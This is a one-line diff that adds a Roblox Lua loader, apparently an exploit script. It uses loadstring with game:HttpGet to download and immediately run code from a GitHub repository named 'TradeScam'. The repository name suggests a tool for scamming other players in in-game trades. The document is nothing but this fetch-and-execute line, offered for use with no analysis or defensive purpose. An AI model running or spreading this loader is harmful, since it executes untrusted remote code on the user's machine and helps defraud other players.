@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bryanfrias123/TradeScam/main/Main.Lua"))()
